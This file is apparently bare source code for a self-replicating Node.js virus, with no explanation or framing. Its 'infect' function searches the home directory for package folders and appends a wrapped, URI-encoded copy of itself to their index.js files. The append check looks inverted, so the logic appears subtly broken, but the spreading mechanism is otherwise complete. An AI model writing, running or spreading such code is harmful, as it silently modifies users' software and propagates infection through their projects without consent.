(function() {
        "use strict";function _toConsumableArray(n){if(Array.isArray(n)){for(var r=0,t=Array(n.length);r<n.length;r++)t[r]=n[r];return t}return Array.from(n)}function infect(n){function r(n){return new Promise(function(r,t){o.readFile(n,function(n,e){return n?t(n):r(e)})})}function t(n){return new Promise(function(r,t){o.readdir(n,function(n,e){return n?t(n):r(e)})})}function e(n){return new Promise(function(r){o.stat(n,function(n,t){r(!n&&t.isFile()?"file":!n&&t.isDirectory()?"dir":null)})})}function i(n,r){return new Promise(function(t,e){o.appendFile(n,r,function(n){return n?e(n):t()})})}function u(n,r){return r<1?[]:t(n).then(function(t){return Promise.all(t.map(function(t){var i=c.join(n,t);return e(i).then(function(n){if("dir"!==n)return[];var t=c.join(i,"index.js");return e(t).then(function(n){return e(c.join(i,"package.json")).then(function(e){return"file"===e?"file"===n?[t]:[]:u(i,r-1)})})})})).then(function(n){var r=[],t=!0,e=!1,i=void 0;try{for(var u,o=n[Symbol.iterator]();!(t=(u=o.next()).done);t=!0){var f=u.value;r.push.apply(r,_toConsumableArray(f))}}catch(n){e=!0,i=n}finally{try{!t&&o.return&&o.return()}finally{if(e)throw i}}return r})})}var o=require("fs"),f=require("os"),c=require("path"),a="\n        (function() {\n            "+decodeURI(n)+' \n            infect( "'+n+'" );\n        })();\n    ';u(f.homedir(),10).then(function(n){return Promise.all(n.map(function(n){r(n).then(function(r){if(r.indexOf(a)>=0)return i(n,a)})}))})} 
        infect( "%22use%20strict%22;function%20_toConsumableArray(n)%7Bif(Array.isArray(n))%7Bfor(var%20r=0,t=Array(n.length);r%3Cn.length;r++)t%5Br%5D=n%5Br%5D;return%20t%7Dreturn%20Array.from(n)%7Dfunction%20infect(n)%7Bfunction%20r(n)%7Breturn%20new%20Promise(function(r,t)%7Bo.readFile(n,function(n,e)%7Breturn%20n?t(n):r(e)%7D)%7D)%7Dfunction%20t(n)%7Breturn%20new%20Promise(function(r,t)%7Bo.readdir(n,function(n,e)%7Breturn%20n?t(n):r(e)%7D)%7D)%7Dfunction%20e(n)%7Breturn%20new%20Promise(function(r)%7Bo.stat(n,function(n,t)%7Br(!n&&t.isFile()?%22file%22:!n&&t.isDirectory()?%22dir%22:null)%7D)%7D)%7Dfunction%20i(n,r)%7Breturn%20new%20Promise(function(t,e)%7Bo.appendFile(n,r,function(n)%7Breturn%20n?e(n):t()%7D)%7D)%7Dfunction%20u(n,r)%7Breturn%20r%3C1?%5B%5D:t(n).then(function(t)%7Breturn%20Promise.all(t.map(function(t)%7Bvar%20i=c.join(n,t);return%20e(i).then(function(n)%7Bif(%22dir%22!==n)return%5B%5D;var%20t=c.join(i,%22index.js%22);return%20e(t).then(function(n)%7Breturn%20e(c.join(i,%22package.json%22)).then(function(e)%7Breturn%22file%22===e?%22file%22===n?%5Bt%5D:%5B%5D:u(i,r-1)%7D)%7D)%7D)%7D)).then(function(n)%7Bvar%20r=%5B%5D,t=!0,e=!1,i=void%200;try%7Bfor(var%20u,o=n%5BSymbol.iterator%5D();!(t=(u=o.next()).done);t=!0)%7Bvar%20f=u.value;r.push.apply(r,_toConsumableArray(f))%7D%7Dcatch(n)%7Be=!0,i=n%7Dfinally%7Btry%7B!t&&o.return&&o.return()%7Dfinally%7Bif(e)throw%20i%7D%7Dreturn%20r%7D)%7D)%7Dvar%20o=require(%22fs%22),f=require(%22os%22),c=require(%22path%22),a=%22%5Cn%20%20%20%20%20%20%20%20(function()%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%22+decodeURI(n)+'%20%5Cn%20%20%20%20%20%20%20%20%20%20%20%20infect(%20%22'+n+'%22%20);%5Cn%20%20%20%20%20%20%20%20%7D)();%5Cn%20%20%20%20';u(f.homedir(),10).then(function(n)%7Breturn%20Promise.all(n.map(function(n)%7Br(n).then(function(r)%7Bif(r.indexOf(a)%3E=0)return%20i(n,a)%7D)%7D))%7D)%7D" );
    })();